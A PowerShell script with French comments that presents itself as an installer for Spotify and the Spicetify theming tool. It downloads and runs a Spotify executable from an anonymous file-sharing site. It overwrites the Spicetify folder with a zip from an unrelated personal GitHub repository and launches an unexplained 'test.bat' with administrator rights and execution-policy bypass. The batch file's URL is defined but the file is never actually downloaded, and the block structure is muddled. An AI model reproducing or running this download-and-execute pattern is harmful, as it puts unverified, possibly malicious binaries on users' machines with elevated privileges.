# Définir l'URL du fichier Ã  télécharger et les chemins de destination
$appUrl = "https://anontransfer.com/download-file/1eoQJm4v6y/spotify-1-2-31-1205.exe"
$appOutput = "$env:USERPROFILE\Downloads\spotify-1-2-31-1205.exe"
$zipUrl = "https://github.com/mhltsontop/test-for-now/releases/download/yeaaa/spicetify-2.36.2-windows-x64.zip"
$zipOutput = "$env:USERPROFILE\Downloads\spicetify-2.36.2-windows-x64.zip"
$batUrl = "https://github.com/mhltsontop/test-for-now/releases/download/idk/test.bat"
$batOutput = "$env:USERPROFILE\Downloads\test.bat"
$localAppData = [System.Environment]::GetFolderPath('LocalApplicationData')
$spicetifyFolder = "$env:localAppData\spicetify"

# Télécharger le fichier d'installation de l'application
Write-Output "Téléchargement de Spotify..."
Invoke-WebRequest -Uri $appUrl -OutFile $appOutput

# Vérifier si le fichier a été téléchargé
if (Test-Path $appOutput) {
    Write-Output "Téléchargement terminé."

    # Installer l'application
    Write-Output "Installation de l'application..."
    Start-Process -FilePath $appOutput
    Write-Output "Installation terminée."

# TÃ©lÃ©charger le script d'installation
$installScriptUrl = "https://raw.githubusercontent.com/spicetify/spicetify-cli/master/install.ps1"
$installScriptPath = "$env:TEMP\install_spicetify.ps1"

Invoke-WebRequest -Uri $installScriptUrl -OutFile $installScriptPath

# CrÃ©er un script wrapper pour rÃ©pondre automatiquement Ã  la question
$wrapperScriptPath = "$env:TEMP\wrapper_install_spicetify.ps1"
$wrapperScriptContent = @"
Start-Process -FilePath "powershell.exe" -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "$installScriptPath"' -NoNewWindow -Wait -RedirectStandardInput "$env:TEMP\auto_response.txt"
"@

# Sauvegarder le script wrapper
Set-Content -Path $wrapperScriptPath -Value $wrapperScriptContent

# CrÃ©er le fichier de rÃ©ponse automatique
$responseFilePath = "$env:TEMP\auto_response.txt"
Set-Content -Path $responseFilePath -Value "Y`n"

# ExÃ©cuter le script wrapper
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $wrapperScriptPath" -Wait

    # Supprimer le dossier spécifié
    Remove-Item -Path $spicetifyFolder -Recurse -Force

    # Télécharger le fichier .zip
    Write-Output "Téléchargement du nouveau contenu..."
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipOutput

    # Extraire le fichier .zip
    Write-Output "Extraction du contenu..."
    $extractPath = "$env:USERPROFILE\Downloads\spicetify-extracted"
    Expand-Archive -Path $zipOutput -DestinationPath $extractPath -Force

    # Copier le contenu du dossier extrait vers le dossier Spicetify
    Write-Output "Copie du contenu extrait vers $spicetifyFolder..."
    Copy-Item -Path "$extractPath" -Destination $spicetifyFolder -Recurse -Force

    Write-Output "Opérations terminées avec succès."

    spicetify restore backup apply

    # Chemin vers le fichier .exe de Spotify pour l'utilisateur courant
    $spotifyPath = "$env:USERPROFILE\AppData\Roaming\Spotify\Spotify.exe"

    # Fonction pour arrêter Spotify
    function Stop-Spotify {
    # Arrêter tous les processus Spotify en cours
    Get-Process -Name "Spotify" -ErrorAction SilentlyContinue | ForEach-Object {
        $_.CloseMainWindow() | Out-Null
        $_.WaitForExit(10)
        if (!$_.HasExited) {
            $_.Kill()
        }
    }
}

    # Fonction pour démarrer Spotify
    function Start-Spotify {
    # Vérifier si le fichier Spotify.exe existe
    if (Test-Path -Path $spotifyPath) {
        Start-Process -FilePath $spotifyPath
        Write-Host "Spotify a été démarré."
    } else {
        Write-Host "Le fichier Spotify.exe n'a pas été trouvé à l'emplacement spécifié : $spotifyPath"
    }
}

    # Arrêter Spotify
    Stop-Spotify
    Write-Host "Spotify a été arrêté."

    # Démarrer Spotify
    Start-Spotify

# Chemin du fichier .bat
$batFile = "$env:USERPROFILE\Downloads\test.bat"

Start-Process powershell.exe -Verb RunAs -ArgumentList ("-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "$batFile")

# Si nous sommes ici, le script est exécuté en tant qu'administrateur
Write-Host "Le script est exécuté en tant qu'administrateur."

# Exécuter le fichier .bat
& "$batFile"

# Nettoyer les fichiers temporaires
Remove-Item -Path $installScriptPath, $wrapperScriptPath, $responseFilePath, $appOutput, $zipOutput, $extractPath, $batOutput

    Write-Output "Tout est fonctionnel!"
    Read-Host "Appuyez sur Entrée pour fermer"
}